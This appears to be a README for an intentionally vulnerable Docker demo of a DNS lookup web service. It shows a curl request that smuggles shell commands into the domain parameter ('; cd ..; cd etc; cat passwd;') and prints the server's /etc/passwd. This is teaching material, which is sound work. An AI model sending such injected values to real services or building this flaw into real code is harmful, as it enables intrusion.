# Command injection example

One of those dns lookup websites.

## Build container

```console
> docker build -t commandinjection .
```

## Start container 

```console
> docker run --rm -it -p 8080:80 commandinjection:latest
```

## Reqular request

```console
> curl 'http://localhost:8080/dns_lookup/google.com'
{"result":["64.233.161.100","64.233.161.102","64.233.161.139","64.233.161.113","64.233.161.101","64.233.161.138"]}
```

## Command execution

```console
> curl 'http://localhost:8080/dns_lookup/google.com%3B%20cd%20..%3B%20cd%20etc%3B%20cat%20passwd%3B'
# "http://localhost:8080/dns_lookup/google.com; cd ..; cd etc; cat passwd;"
{
  "result": [
    "64.233.161.138",
    "64.233.161.139",
    "64.233.161.102",
    "64.233.161.113",
    "64.233.161.100",
    "64.233.161.101",
    "root:x:0:0:root:/root:/bin/sh",
    "bin:x:1:1:bin:/bin:/sbin/nologin",
    "daemon:x:2:2:daemon:/sbin:/sbin/nologin",
    "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin",
    "sync:x:5:0:sync:/sbin:/bin/sync",
    "shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown",
    "halt:x:7:0:halt:/sbin:/sbin/halt",
    "mail:x:8:12:mail:/var/mail:/sbin/nologin",
    "news:x:9:13:news:/usr/lib/news:/sbin/nologin",
    "uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin",
    "cron:x:16:16:cron:/var/spool/cron:/sbin/nologin",
    "ftp:x:21:21::/var/lib/ftp:/sbin/nologin",
    "sshd:x:22:22:sshd:/dev/null:/sbin/nologin",
    "games:x:35:35:games:/usr/games:/sbin/nologin",
    "ntp:x:123:123:NTP:/var/empty:/sbin/nologin",
    "guest:x:405:100:guest:/dev/null:/sbin/nologin",
    "nobody:x:65534:65534:nobody:/:/sbin/nologin"
  ]
}
```
